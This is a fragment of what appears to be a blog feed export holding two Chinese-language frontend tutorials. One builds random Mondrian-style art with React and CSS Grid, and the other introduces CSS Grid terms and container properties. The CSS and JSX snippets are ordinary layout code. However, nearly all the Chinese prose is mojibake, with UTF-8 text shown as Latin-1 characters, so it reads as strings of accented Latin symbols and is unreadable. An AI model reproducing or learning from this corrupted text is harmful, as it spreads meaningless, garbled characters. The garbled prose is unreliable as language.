    <content><![CDATA[å‰è¨€å‰é™£å­ netflix ä¸Šäº†æœ€æ–°ä¸€å­£çš„å¤œé­”ä¿ ï¼Œå…¶ä¸­çš„åæ´¾è§’è‰²å¾ˆæ„›åœ¨å®¶ä¸­æ“ºè¨­ç•«ä½œï¼Œæœ‰äº†è—è¡“å“è¥¯æ‰˜ï¼Œå£äººåœ¨æˆ‘çš„è…¦æµ·è£¡çªç„¶å°±è®Šæˆçœ‹ä¼¼å¾ˆæœ‰æ·±åº¦çš„è§’è‰²ã€‚é€™è®“æˆ‘è¦ºå¾—æ‡‰è©²ä¹Ÿè©²æ“ºé»ç•«ä½œåœ¨å®¶è£¡ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½æé«˜è‡ªå·±çš„å±¤æ¬¡ã€‚
è€Œå®…å®…å¦‚æˆ‘ç•¶ç„¶ç„¡æ³•åšå¦‚æ­¤çš„æŠ•è³‡ï¼Œä¸éå¦‚æœèƒ½å¤ è‡ªå·±ç”¨ Web æŠ€è¡“ç”¢ç”Ÿä¸€äº›è—è¡“ä½œå“ï¼Œç„¶å¾ŒæŠ•å½±åœ¨å®¶ä¸­å‘¢ï¼Ÿæ‡‰è©²å¾ˆé…·å§ï¼ç„¶å¾Œå°±åœ¨ codepen ä¸Šç™¼ç¾äº†ä¸€å€‹æœ‰è¶£çš„æ±è¥¿ï¼š
See the Pen Randomly generate Mondrian Art with CSS Grid + Vue ğŸ¨ by Jhey (@jh3y) on CodePen.


çœ‹èµ·ä¾†ç…æœ‰å…¶äº‹å•Šï¼åŸä¾†ç°¡å–®åˆ©ç”¨ CSS Grid å°±èƒ½æ’å‡ºé€™æ¨£çš„è—è¡“åœ–ç•«ï¼ æŸ¥äº†ä¸€ä¸‹é€™å«åšè’™å¾·é‡Œå®‰ (mondrian art)ã€‚
è‡¨æ‘¹ä¹Ÿç®—æ˜¯ä¸€ç¨®å­¸ç¿’ï¼ŒåŸä½œè€…æ˜¯ä½¿ç”¨ Vue.js èˆ‡ Stylus è£½ä½œï¼Œä»Šå¤©æˆ‘å€‘å°±ç°¡å–®åˆ©ç”¨ React ä¾†é‡æ–°å¯¦ä½œä¸€æ¬¡ä¸¦èªªæ˜åŸç†å§ï¼
CSS Grid å°è¤‡ç¿’å¦‚æœæœ‰ä¸äº†è§£ CSS Grid çš„è®€è€…ï¼Œå¯ä»¥å…ˆå»çœ‹æˆ‘å…ˆå‰å¯«çš„ä»‹ç´¹ - èˆ‡ CSS Grid çš„ç¬¬ä¸€æ¬¡æ¥è§¸ æˆ–æ˜¯å¾ˆå®Œæ•´çš„ A Complete Guide to Gridã€‚
é€™é‚Šç°¡å–®ç¸½çµä¸€ä¸‹ CSS Grid çš„ç‰¹æ€§ï¼š
ç›¸æ¯”æ–¼ Flexbox æ˜¯ one-dimensional layout solutionï¼ŒCSS Grid å¯ä»¥ç†è§£ç‚º two-dimentional layout solutionã€‚
ä¹Ÿå°±æ˜¯èªªï¼Œä½ èƒ½å¤ åœ¨äºŒç¶­å¹³é¢ä¸Šï¼Œé€éç¶²æ ¼ç³»çµ±ä¾†æ“ºæ”¾ä½ çš„å…ƒä»¶ä½ç½®ã€‚
ç¾åœ¨æœ€æ–°ç‰ˆçš„ Chrome èˆ‡ Firefox éƒ½å·²ç¶“æ”¯æ´ CSS Grid Layout äº†ï¼Œä¸¦ä¸”åœ¨ devtool ä¸­èƒ½æ¸…æ¥šçœ‹åˆ°ç¶²æ ¼ç‹€æ…‹ï¼š

å¯¦ä½œå‰çš„å°åˆ†æä¸ç®¡ä½ å° CSS Grid æœ‰æ²’æœ‰æ¦‚å¿µï¼Œçœ‹äº†ä¸Šé¢çš„åœ–æ‡‰è©²ä¹Ÿå¾ˆå¿«å¯ä»¥çŒœå‡ºå…¶åŸç†ã€‚
ä¸»è¦å°±æ˜¯è®“æ•´å€‹ container åˆ‡å‰²æˆæ•¸å€‹å°æ–¹å¡Šï¼Œæ¥è‘—éš¨æ©Ÿç”¢ç”Ÿå‡ºå¤šå€‹å€å¡Šï¼Œæ¯å€‹å€å¡Šéš¨æ©Ÿæ©«è·¨ä¸åŒçš„è¡Œæ•¸èˆ‡åˆ—æ•¸ï¼Œä¸¦å¡«ä¸Šä¸åŒé¡è‰²ï¼Œå°‡ container å¡«æ»¿å³å¯ã€‚
æœ‰é»åƒæ˜¯ä¸ƒå·§æ¿çš„æ„Ÿè¦ºï¼Œåªæ˜¯æˆ‘å€‘çš„æ¿å­éƒ½æ˜¯çŸ©å½¢~ ä¸éè½èµ·ä¾†ç°¡å–®ï¼Œå¯¦ä½œä¸Šé‚„æ˜¯æœ‰äº›ç´°ç¯€éœ€è¦æ³¨æ„çš„ã€‚
é–‹å§‹å¯¦ä½œï¼ç¬¬ä¸€æ­¥æ˜¯å…ˆå®šç¾©å‡ºæˆ‘å€‘é€™å¹…ç•«ä½œçš„ç•«æ¡†ï¼Œä¹Ÿå°±æ˜¯ CSS Grid ä¸­çš„ containerï¼Œé€éé€™å€‹ container ä¾†å®šç¾©å¥½æ•´å€‹ç¶²æ ¼ç³»çµ±ï¼š
.MondrainArt &#123;  background-color: &quot;#070908&quot;,  border: &quot;10px solid #070908&quot;,  display: &quot;grid&quot;,  grid-gap: &quot;10px&quot;,  grid-template-columns: &quot;repeat(auto-fit, 50px)&quot;,  grid-template-rows: &quot;repeat(auto-fit, 50px)&quot;,  height: &quot;300px&quot;,  overflow: &quot;hidden&quot;,  width: &quot;250px&quot;&#125;

é€™è£¡é¢ç™¼ç”Ÿäº†å¹¾ä»¶äº‹æƒ…ï¼š
æˆ‘å€‘ç”¨ grid-template-columns èˆ‡ grid-template-rows å…ˆè¦ç¯„æˆ‘å€‘çš„ container å…§è¦æœ‰å¤šå°‘æ¬„èˆ‡åˆ—ï¼Œä»¥åŠæ¯æ ¼çš„é•·å¯¬ã€‚
ç”±æ–¼æ¯å€‹æ ¼å­çš„å¤§å°æˆ‘å€‘è¦å›ºå®šï¼Œæ‰€ä»¥ä½¿ç”¨ repeat()ï¼Œä¸¦ä¸”æ¡ç”¨ &lt;auto-repeat&gt; values çš„èªæ³•ï¼Œé€™æ¨£åšçš„å¥½è™•æ˜¯æˆ‘å€‘åªè¦å›ºå®šå¥½ container çš„å¯¬é«˜ï¼Œä¸ç”¨å»é™åˆ¶ grid çš„ column æ•¸èˆ‡ row æ•¸ï¼Œè®“ CSS Grid å¹«æˆ‘å€‘è¨ˆç®—å‡ºä¸æœƒ overflow çš„æ•¸ç›®ã€‚MDN: repeat()
è‡³æ–¼è¦ç”¨ auto-fit æˆ–æ˜¯ auto-fillï¼Œ åœ¨é€™é‚Šçš„ä¾‹å­ä¸­å…¶å¯¦éƒ½å¯ä»¥ï¼Œå› ç‚ºé€™å…©è€…çš„å·®åˆ¥ä¸»è¦åœ¨æ–¼å¯¬åº¦æ”¹è®Šæ™‚ï¼Œé‡å°å¤šå‡ºçš„ç©ºé–“åœ¨é‹ç”¨ä¸Šæœ‰ä¸åŒçš„æ–¹å¼ï¼š
ä»¥ auto-fit ä¾†èªªï¼Œè¦–è¦ºä¸Šçš„æ•ˆæœæ˜¯æœƒå°‡åŸæœ¬ column å…§çš„ item å¯¬åº¦éƒ½å¹³å‡æ‹‰é•·ï¼Œä½†å¯¦éš›ä¸Šé‚„æ˜¯æœ‰æ–°å¢ column æ•¸ï¼Œåªæ˜¯å› ç‚º content æ˜¯ç©ºçš„ï¼Œæ‰€ä»¥ç©ºé–“è¢«å£“ç¸®äº†ï¼š
source
è€Œ auto-fill å‰‡æ˜¯ä¸ç®¡æ˜¯å¦æœ‰æ–°çš„ content åœ¨ï¼Œæ–°å¢çš„ column æ•¸éƒ½æœƒä½”æœ‰ä¸€æ¨£çš„ç©ºé–“å¤§å°ï¼Œä¸¦ä¸æœƒå»å»¶ä¼¸åŸæœ‰ item çš„å¯¬åº¦ï¼š
source
æ¥è‘—ï¼Œåˆ©ç”¨ gap: 10px 10px è¨­å®šå¥½æ¯å€‹æ ¼å­é–“çš„ç©ºéš™ï¼›ç„¶å¾Œçµ¦å®šä¸€å€‹å›ºå®šçš„å¯¬é«˜ä¸¦å°‡ overflow hidden èµ·ä¾†ã€‚
åˆ°é€™é‚Šç‚ºæ­¢ï¼Œæˆ‘å€‘å¯ä»¥å…ˆåœ¨ container å…§æ”¾å…¥æ•¸å€‹ grid itemï¼Œç„¶å¾Œæ¯å€‹ item çš„ grid-column èˆ‡ grid-row çš†è¨­ç½®ç‚º span 1ï¼Œä¹Ÿå°±æ˜¯éƒ½åªå  grid çš„ä¸­çš„ä¸€å€‹å–®ä½ã€‚å¦‚æ­¤ä¸€ä¾†å°±èƒ½çœ‹åˆ°ç›®å‰çš„æ ¼å­æ¨£å¼ï¼š


éš¨æ©Ÿç”¢ç”Ÿä¸åŒå¤§å°çš„å€å¡Šæœ‰äº†åŸºç¤çš„æ ¼å­å¾Œï¼Œçœ‹èµ·ä¾†æˆ‘å€‘æ¥è‘—åªè¦æŠŠç›®å‰ grid item çš„ grid-column èˆ‡ grid-row æ”¹é€ ä¸€ä¸‹å°±å¤§åŠŸå‘Šæˆäº†å§!?
é¦¬ä¸Šä¾†è©¦è©¦ï¼
é¦–å…ˆï¼Œå…ˆåšé»æ•¸å­¸ï¼Œæˆ‘å€‘å‰›å‰›è¨­å®šæ¯å€‹æ ¼å­æ˜¯ 50pxï¼Œè€Œæ¯å€‹æ ¼å­çš„é–“è· gap ç‚º 10pxï¼Œè€Œå¯¬åº¦ç‚º 250pxï¼Œæ‰€ä»¥æ¯ä¸€å€‹ row æœ€å¤šå°±æ˜¯ 4 å€‹æ ¼å­ã€‚ï¼ˆç”¨è‚‰çœ¼çœ‹ä¸Šåœ–å…¶å¯¦å°±çŸ¥é“äº†â€¦ï¼‰
ç‚ºä»€éº¼è¦ç®—é€™å€‹å‘¢ï¼Ÿ
å› ç‚ºæˆ‘å€‘è¦è®“ grid item çš„ grid-column èˆ‡ grid-row éš¨æ©Ÿåˆ†é…ï¼Œä½†è¦åœ¨æ­£ç¢ºçš„ç¯„åœå…§ï¼Œæ›´æ”¹ä¸Šé¢ç¯„ä¾‹å…§çš„ generateBlocks() å¦‚ä¸‹ï¼Œä¸¦åŠ ä¸Šå€‹ colorMap ä¾†éš¨æ©Ÿåˆ†é…é¡è‰²ï¼š
colorMap = &#123;  0: &quot;rgb(248, 217, 45)&quot;,  1: &quot;rgb(248, 217, 45)&quot;,  2: &quot;rgb(242, 245, 241)&quot;,  3: &quot;rgb(11, 84, 164)&quot;,  4: &quot;rgb(214, 0, 20)&quot;,  5: &quot;rgb(11, 84, 164)&quot;&#125;;generateBlocks = () =&gt; &#123;  return Array.from(Array(20).keys()).map(i =&gt; (    &lt;div      key=&#123;`blocks-$&#123;i&#125;`&#125;      style=&#123;&#123;        gridColumn: `span $&#123;Math.floor(Math.random() * 3 + 1)&#125;`,        gridRow: `span $&#123;Math.floor(Math.random() * 3 + 1)&#125;`,        backgroundColor: this.colorMap[Math.floor(Math.random() * 5)]      &#125;&#125;    /&gt;  ));&#125;;

å¯ä»¥å¾—åˆ°ä»¥ä¸‹çµæœï¼š


ç–‘ï¼Ÿå¥½åƒè·Ÿæƒ³åƒä¸å¤ªä¸€æ¨£ï¼Ÿ
çš„ç¢ºæ˜¯éš¨æ©Ÿç”¢ç”Ÿäº†æ©«è·¨ä¸åŒæ¬„ä½æ•¸çš„å€å¡Šï¼Œä½†æ˜¯å¤§å°å¥½åƒä¸å¤ªå°å•Šï¼
é‚£æ˜¯å› ç‚ºæˆ‘å€‘æ²’è¾¦æ³•ä¿è­‰éš¨æ©Ÿç”¢ç”Ÿçš„ grid-area éƒ½èƒ½å‰›å‰›å¥½æ¥çºŒè‘—å„è‡ªçš„èµ·å§‹é»æ’æ»¿æ»¿çš„ï¼Œæ‰€ä»¥å¯èƒ½ç™¼ç”Ÿä¸‹åˆ—æƒ…æ³ï¼š

åœ¨å³ä¸‹è§’å¯¦éš›ç”¢ç”Ÿçš„é»ƒè‰²å€å¡Šå‰ï¼Œrow5 èˆ‡ row6 çš„ä½ç½®å¯¦éš›ä¸Šæ˜¯ç©ºçš„ï¼Œæ‰€ä»¥ grid layout æœƒå°‡å…¶ç•¶ä½œç‚ºé«˜åº¦ 0 çš„ itemã€‚
å¥½åœ¨ï¼Œæˆ‘å€‘å¯ä»¥åˆ©ç”¨ grid-auto-columns èˆ‡ grid-auto-rows ä¾†è§£æ±ºï¼css-tricks
æˆ‘å€‘åœ¨ container åŠ ä¸Šä»¥ä¸‹è¨­å®šï¼š
grid-auto-columns: &quot;50px&quot;,grid-auto-rows: &quot;50px&quot;,

é€™æ¨£å°±æœƒè®“ grid layout çŸ¥é“ç©ºçš„æ¬„ä½æˆ‘å€‘æƒ³è¦è‡ªå‹•å¡«è£œä¸Š 50px çš„å¤§å°ã€‚
åŸºæœ¬ä¸Šåˆ°æ­¤ç‚ºæ­¢å°±å®Œæˆäº†ä¸€å€‹ä¸éŒ¯çš„ç‰ˆæœ¬ï¼š

ä½†ç¸½é‚„æ˜¯è¦ºå¾—æ€ªæ€ªçš„ï¼Œå¥½åƒâ€œä¸å¤ å¯†â€ã€‚
æœ‰äº›å€å¡Šå¦‚æœèƒ½æ›å€‹ä½ç½®ä¼¼ä¹æœƒå¥½çœ‹ä¸€é»ï¼Ÿ
ç”±æ–¼æˆ‘å€‘ä¸¦æ²’æœ‰æ˜ç¢ºæŒ‡å®šæ¯å€‹å€å¡Šåœ¨ grid ä¸­çš„ç¢ºåˆ‡ä½ç½®ï¼Œgrid layout æœƒæ¡ç”¨ä¸€å€‹ auto-placement algorithm ä¾†æ“ºæ”¾ï¼Œè€Œæˆ‘å€‘èƒ½é€é grid-auto-flow é€™å€‹å±¬æ€§ä¾†æ›´æ”¹å…¶æ’æ”¾çš„è¦å‰‡ã€‚css-tricks
grid-auto-flow æœ‰ row, column èˆ‡ dense é€™ä¸‰ç¨®å€¼å¯ä»¥è¨­ç½®ï¼Œå¾å­—é¢ä¸Šä¾†çœ‹å°±èƒ½ç†è§£å„è‡ªä»£è¡¨çš„æ„æ€ï¼Œå¦‚æœä½ è¨­å®šç‚º row æˆ– columnï¼Œé‚£ grid layout æœƒç›¡é‡å¹«ä½ çš„ item ç…§è‘—åˆ—èˆ‡è¡Œçš„æ–¹å‘ç…§é †åºæ’æ”¾ï¼›è€Œ dense å‰‡æ˜¯æœƒç›¡é‡æŠŠç©ºé–“å¡æ»¿ï¼Œå°çš„ item å°±å¯èƒ½æœƒå…ˆæ’åœ¨å¤§çš„ item ä¹‹å‰ï¼Œè·Ÿä½ åœ¨ html dom ä¸Šçš„æ’æ”¾ä½ç½®å¯èƒ½æœ‰æ‰€è½å·®ï¼Œå°æ–¼ accessibility ä¸¦ä¸å¥½ï¼Œä½†ä»¥æˆ‘å€‘çš„ case ä¾†èªªï¼Œä¸éœ€è¦è€ƒæ…®é‚£äº›ï¼Œå°±å¤§è†½æ¡ç”¨ dense å°±å°äº†ï¼
æœ€çµ‚æˆæœæœ€å¾Œæˆ‘å€‘å¯ä»¥å†åŠ ä¸Šä¸€é»é»å‹•ç•«æ•ˆæœï¼Œè®“ react component æ¯äº”ç§’é‡æ–° render ä¸€æ¬¡æ–°çš„åœ–æ¡ˆï¼Œé€™æ¨£æŠ•æ”¾å‡ºä¾†ä»¥å¾Œï¼Œå°±å¥½åƒä½ æœ‰ä¸€å¹…ä¸æ–·è‡ªè¡Œè®ŠåŒ–çš„è—è¡“å“ä¸€èˆ¬äº†ï¼


çµè«–æœ‰è¶£çš„ä½œå“å¯¦ä½œèµ·ä¾†å¯èƒ½åŸç†å¾ˆç°¡å–®ï¼Œä½†ä¹Ÿæ˜¯æœ‰ä¸€äº›çœ‰çœ‰è§’è§’éœ€è¦æ³¨æ„ã€‚é€éé€™æ¬¡çš„å¯¦ä½œï¼Œé‡æ–°è¤‡ç¿’äº†ä¸€æ¬¡ CSS Grid çš„å¥½è™•èˆ‡ç”¨æ³•ï¼Œä¹ŸæœŸè¨±è‡ªå·±æœªä¾†èƒ½å¤ æœ‰æ›´å¤šçš„æ™‚é–“å»æ€è€ƒèˆ‡å‰µé€ é€™æ¨£çš„ä½œå“ï¼
è³‡æ–™ä¾†æº
A Complete Guide to Grid
Randomly generate Mondrian Art with CSS Grid + Vue ğŸ¨
Grid by Example
css-grid-polyfill

é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>react</tag>
        <tag>css</tag>
        <tag>grid</tag>
        <tag>mondrian</tag>
      </tags>
  </entry>
  <entry>
    <title>èˆ‡ CSS Grid çš„ç¬¬ä¸€æ¬¡æ¥è§¸</title>
    <url>/2017/02/03/css-grid-intro/</url>
    <content><![CDATA[å‰è¨€å»ºæ§‹ç¶²é ä½ˆå±€æ˜¯è£½ä½œç¶²ç«™çš„åŸºæœ¬å‹•ä½œä¹‹ä¸€ï¼Œéš¨è‘—è¨­è¨ˆå¤šæ¨£æ€§èˆ‡åŠŸèƒ½è¤‡é›œåº¦çš„æå‡ï¼Œé–‹ç™¼è€…å¿…é ˆåˆ©ç”¨ table, inline, float, clear, æˆ–æ˜¯ positioning ç­‰æ–¹å¼ä¾† hack é é¢é…ç½®ï¼Œä½†ä¸ç®¡æ˜¯å“ªç¨®æ–¹å¼éƒ½å„è‡ªæœ‰å…¶ç¼ºä¹çš„åŠŸèƒ½ï¼Œä¹Ÿå› æ­¤å‚¬ç”Ÿå‡ºè¨±å¤š CSS Framework æä¾›çš„ Grid System ä¾†åŠ é€Ÿä½ˆå±€é–‹ç™¼ã€‚
å¹¾å¹´å‰å‡ºç¾çš„ FlexBox å®›å¦‚ç¥å…µåˆ©å™¨ï¼Œè®“æˆ‘å€‘å¯ä»¥æ“ºè„«é€™äº›å›°æ“¾ï¼Œå¿«é€Ÿé€²è¡Œæ’ç‰ˆï¼Œè€Œéš¨è‘— CSS Grid è¦ç¯„çš„å‡ºç¾ï¼Œæˆ‘å€‘å³å°‡æœ‰æ›´å¥½çš„æ­¦å™¨äº†ï¼
CSS Grid ä¸æ˜¯è¦ä¾†å–ä»£ Flexboxï¼Œä»–å€‘æ˜¯ç›¸è¼”ç›¸æˆçš„è§’è‰²ï¼Œflex å¯ä»¥çœ‹ä½œæ˜¯ one-dimensional layout solutionï¼ŒCSS Grid å‰‡æ˜¯ two-dimentional layout solutionï¼Œç”¨ä¾†è§£æ±ºæˆ‘å€‘æ‰€æœ‰å…ˆå‰éœ€è¦å„ç¨® hack æ‰èƒ½å®Œæˆçš„é é¢ä½ˆå±€ã€‚
ä¸éå¯æƒœçš„æ˜¯ï¼ŒCSS Grid é‚„åœ¨ W3C working draft ä¸­ï¼Œä¸¦ä¸”ç›´åˆ° 2017 çš„ä»Šå¤©ï¼Œé‚„æ˜¯æœ‰äº›äººä½¿ç”¨ä¸æ”¯æ´ flex çš„èˆŠç€è¦½å™¨â€¦


å¾ä¸Šåœ–å¯ä»¥å¾—çŸ¥ï¼ŒChrome è·Ÿ Firefox çš„ä¸‹ä¸€å€‹ç‰ˆæœ¬éƒ½æœƒé è¨­æ”¯æ´ CSS Gridï¼Œè€Œ IE&#x2F;Edge ç›®å‰å‰‡æ˜¯æ”¯æ´èˆŠç‰ˆæœ¬çš„è¦æ ¼å¯¦ä½œçš„ã€‚å¦‚æœæƒ³è¦å…ˆåšé®®ï¼Œå¯ä»¥ç›´æ¥ä¸‹è¼‰ Chrome Canary, Firefox Nightly ä¾†ä½¿ç”¨ï¼Œæˆ–æ˜¯é–‹å•Ÿç›®å‰ç‰ˆæœ¬çš„å¯¦é©—åŠŸèƒ½ï¼š

Chrome: chrome://flags -&gt; å•Ÿç”¨ experimental Web Platform features
Firefox: about:config -&gt; å•Ÿç”¨ layout.css.grid.enabled

ç•¶ç„¶ä¹Ÿæœ‰ Polyfill å¯ä»¥ä½¿ç”¨ã€‚
é›–ç„¶ç”Ÿä¸é€¢æ™‚ï¼Œä½†é€™ä¸€åˆ‡éƒ½æ˜¯éç¨‹ï¼Œæ´»è‘—ä¸é›£ï¼Œæœ€é›£çš„æ˜¯åšäººâ€¦å•Šå•Šè›‹å ¡çš„æ­ŒçœŸå¥½è½
é€™ç¯‡æ–‡ç« ä¸»è¦æ˜¯ä»‹ç´¹ CSS Grid çš„ç”¨æ³•ï¼Œä¸¦ç‚ºæˆ‘è‡ªå·±åšå€‹å­¸ç¿’ç´€éŒ„ï¼Œç•¢ç«Ÿç¶²è·¯ä¸Šå·²ç¶“æœ‰è¨±å¤šé—œæ–¼ CSS Grid çš„è³‡æºï¼Œæˆ‘ä¹Ÿæ¢åˆ—äº†ä¸€äº›åœ¨æ–‡ç« æœ€ä¸‹æ–¹ï¼Œæ‡¶å¾—çœ‹æˆ‘å»¢è¨€çš„è®€è€…å¯ä»¥è‡ªè¡Œåƒè€ƒï¼
CSS Grid Layoutä»¥å¾€æˆ‘å€‘åœ¨é€²è¡Œé é¢åˆ‡ç‰ˆä½ˆå±€çš„æ™‚å€™ï¼Œå³ä¾¿æ˜¯ä½¿ç”¨ flexboxï¼Œç”±æ–¼ä»–æ˜¯ one-dimensional layoutï¼Œæˆ‘å€‘æ’ç‰ˆçš„æ–¹å¼ç„¡éå°±æ˜¯å¾ä¸Šå¾€ä¸‹æ’ï¼Œæˆ–æ˜¯ç”±å·¦åˆ°å³ç­‰æ–¹å‘æ€§ä¾†æŠŠå„ç¨® one-dimensional layout çµ„åˆæˆæˆ‘å€‘è¦çš„ two-dimensional layoutã€‚
è€Œ CSS Grid ä¸åŒçš„åœ°æ–¹å°±åœ¨æ–¼ï¼Œä»–è®“æˆ‘å€‘å…ˆå®šç¾©å¥½ä¸€å€‹ container å°±å¤ äº†ï¼Œä¸€å€‹ container ä¾†è¨­å®šå¥½æ‰€æœ‰åº•ä¸‹å…ƒä»¶å¯ä»¥æ“ºæ”¾çš„ä½ç½®ã€‚
ä»€éº¼æ˜¯â€œå¯ä»¥æ“ºæ”¾çš„ä½ç½®â€œå‘¢ï¼Ÿå…ˆè·³éå¯¦ä½œéç¨‹èˆ‡é€™äº›å±¬æ€§å€¼çš„æ„æ€ï¼Œä»¥ä¸‹é¢é€™å¼µçµæœåœ–ä¾†è§£é‡‹ä¸€ä¸‹ï¼Œä½ è¨­å®šå¥½ CSS Grid çš„ container å¾Œï¼Œè©² container æœƒé•·æˆé€™å‰¯å¾·æ€§ï¼š
.container &#123;  grid-template-columns: 100px 10px 0.3fr 0.7fr;  grid-template-rows: 25% 100px auto;&#125;



ç„¶å¾Œä½ å°±åªè¦æŠŠ container å…§çš„å…ƒç´ ï¼Œä¸€ä¸€å®šç¾©å¥½å„è‡ªçš„ CSS å±¬æ€§ï¼Œä¾†æ±ºå®šä»–å€‘è¦æ“ºåœ¨é€™åœ–ä¸­çš„å“ªå€‹ç©ºæ ¼å…§å³å¯ã€‚åªè¦å…©è¡Œ cssï¼Œä¸€å€‹ div å°±æ’å¥½äº†ï¼Œæ˜¯ä¸æ˜¯å¾ˆè®“äººèˆˆå¥®å•Šå•Šå•Šï¼
å¥½çš„ï¼Œæ¥ä¸‹ä¾†èªçœŸèªªæ˜ CSS Grid çš„å…¶ä»–åŸºæœ¬ç”¨æ³•ã€‚
CSS Grid Terminologyå†é–‹å§‹å˜—è©¦å¯¦ä½œä¹‹å‰ï¼Œæˆ‘å€‘å…ˆä¾†äº†è§£ä¸¦è¨˜æ†¶ä¸€ä¸‹ç›¸é—œçš„è¡“èªã€‚

Grid Line: åˆ†éš”å…ƒç´ çš„ç·šï¼Œå¯ä»¥æ˜¯å‚ç›´èˆ‡æ°´å¹³ï¼Œå¦‚ä¸‹åœ–çš„ç´…è‰²ç·š

Grid Track: å…©æ¢åˆ†éš”ç·šä¸­é–“çš„å€åŸŸï¼Œç°¡å–®æƒ³å°±æ˜¯ Grid ä¸­çš„ Columns æˆ– Rowsï¼Œå¦‚ä¸‹åœ–çš„ç¶ è‰²å€å¡Š

Grid Cell: Grid ä¸­çš„åŸºæœ¬å–®ä½ï¼Œå››æ¢ç·šçµ„æˆçš„å€åŸŸï¼Œå¦‚ä¸‹åœ–çš„è—è‰²å€å¡Šã€‚

Grid Area: ç”±æ•¸å€‹ Cell çµ„æˆçš„å€åŸŸï¼Œå¦‚ä¸‹åœ–çš„ç´…è‰²å€å¡Šã€‚

fr: track-size çš„å–®ä½ï¼Œé€šå¸¸ç”¨æ–¼åˆ†é… row æˆ– column çš„éå½ˆæ€§å°ºå¯¸è¨­å®šå®Œå¾Œä¹‹å‰©é¤˜ç©ºé–“ã€‚ä»¥ä¸‹åœ–çš„ columnç‚ºä¾‹ï¼Œæ„æ€å³ï¼šå°‡å»æ‰ 100px èˆ‡ 10px å¾Œçš„å‰©é¤˜ç©ºé–“ï¼Œåˆ†é…ç‚º 30% èˆ‡ 70%ã€‚




Simple CSS Grid Exampleæ¥è‘—æˆ‘å€‘æŠŠä¸Šé¢çš„åœ–ç‰‡ï¼Œç”¨ CSS Grid ä¾† layout å‡ºä¾†ã€‚
CSS Grid çš„ properties å¯ä»¥åˆ‡æˆå…©å¤§å¡Šï¼Œä¸€å¡Šæ˜¯çµ¦ Parent çš„ï¼Œä¹Ÿå°±æ˜¯ Grid Containerï¼Œå¦ä¸€å¡Šçµ¦ Childrenï¼ŒGrid itemsã€‚
è©³ç´°çš„ properties ä»‹ç´¹å¯ä»¥çœ‹é€™ç¯‡ Complete Guide Gridï¼ˆ å¼·åŠ›æ¨è–¦é–±è®€ï¼Œå„ç¨®åœ–ç‰‡æ–‡å­—è¼”ä»¥ css èªªæ˜ï¼Œå®Œå…¨å¯ä»¥ç›´æ¥å·¦è½‰å‡ºå»çœ‹é€™ç¯‡å°±å¥½ XD ï¼‰
è¦ä½¿ç”¨ CSS Grid å°±å¿…é ˆå…ˆå®šç¾©å¥½ Grid Containerï¼š
&lt;div class=&quot;grid-container&quot;&gt;  &lt;div class=&quot;grid-item item-a&quot;&gt;Tack&lt;/div&gt;  &lt;div class=&quot;grid-item item-b&quot;&gt;Cell&lt;/div&gt;  &lt;div class=&quot;grid-item item-c&quot;&gt;Area&lt;/div&gt;&lt;/div&gt;
åœ¨ grid container åº•ä¸‹çš„ children æ˜¯æ²’æœ‰é †åºå·®åˆ¥çš„ï¼Œæˆ‘å€‘éƒ½å¯ä»¥é€éå®šç¾© grid items çš„ properties ä¾†è¨­å®šä»–çš„æ“ºæ”¾ä½ç½®ã€‚ç•¶ç„¶ï¼Œå¦‚æœä½ æ²’æœ‰è¨­å®šçš„è©±ï¼Œå°±æœƒç…§é †åºæ”¾ç½®ï¼Œå¦‚æœè©²åˆ—æ”¾ä¸ä¸‹å°±æœƒè‡ªå‹•æ”¾åˆ°ä¸‹ä¸€è¡Œã€‚
ä½†åŸºæœ¬ä¸Šä¸æœƒé€™éº¼åšï¼Œç•¢ç«Ÿæˆ‘å€‘å°±æ˜¯æƒ³è¦èƒ½å¥½å¥½æŒæ§ä½ç½®å•Šï¼
Grid Container çš„ css å¯ä»¥ç”¨ä¸‹é¢å…©ç¨®æ–¹å¼ä¾†å¯«ï¼Œgrid-template-columns ç”¨ä¾†å®šç¾©é€™å€‹ Grid æœ‰å¹¾å€‹ columnsï¼Œæ¯å€‹ column å¯ä»¥æœ‰å¤šå°‘å¯¬åº¦ï¼›æ›è€Œè¨€ä¹‹ï¼Œgrid-template-rows å°±æ˜¯ç”¨ä¾†å®šç¾© row çš„å±¬æ€§ã€‚
grid-template-columns å’Œ grid-template-rows æœ‰å…©å€‹ä¸»è¦ Values å¯ä»¥è¨­å®šï¼š

track-sizeï¼šå¯ä»¥æ˜¯ä»»ä½•é•·åº¦(px)ã€ç™¾åˆ†æ¯”(%)æˆ–æ˜¯å…ˆå‰æåˆ°çš„ fr
line-nameï¼šçµ„æˆ column èˆ‡ row çš„ç·šçš„åå­—

.container &#123;  grid-template-columns: &lt;track-size&gt; ... | &lt;line-name&gt; &lt;track-size&gt; ...;  grid-template-rows: &lt;track-size&gt; ... | &lt;line-name&gt; &lt;track-size&gt; ...;&#125;

ä¹Ÿå°±æ˜¯èªªï¼Œä½ å¯ä»¥ç”¨ç´”æ•¸å­—çš„æ–¹å¼ä¾†çµ¦äºˆå±¬æ€§è³ªï¼š
.grid-container &#123;  height: 100vh;  display: grid;  grid-template-columns: 100px 10px 0.3fr 0.7fr;  grid-template-rows: 25% 100px auto;&#125;

ä¹Ÿå¯ä»¥å®‰æ’ Grid Line çš„åå­—åœ¨å±¬æ€§å€¼çš„è¨­å®šä¸­ï¼Œé€™å€‹åå­—åœ¨å¾ŒçºŒæˆ‘å€‘è¦å®‰ç½® children æ™‚å¯ä»¥ç”¨åˆ°ï¼[Note] è¦æ³¨æ„ï¼Œå› ç‚ºæ˜¯å®šç¾© ç·š çš„åå­—ï¼Œæ‰€ä»¥æœ€å¾Œä¸€å€‹æ•¸å­—çš„å¾Œé¢ä¹Ÿå¯ä»¥å®šç¾©åå­—å–”ï¼
.grid-container &#123;  height: 100vh;  display: grid;  grid-template-columns: [line1] 100px [line2] 10px [line3] 0.3fr [line4] 0.7fr [end];  grid-template-rows: [row-1-start] 25% [row-2-start] 100px [row-3-start] auto [row-end];&#125;

é€™æ¨£æˆ‘å€‘å°±å®šç¾©å¥½éœ€è¦çš„ Grid Container äº†ã€‚
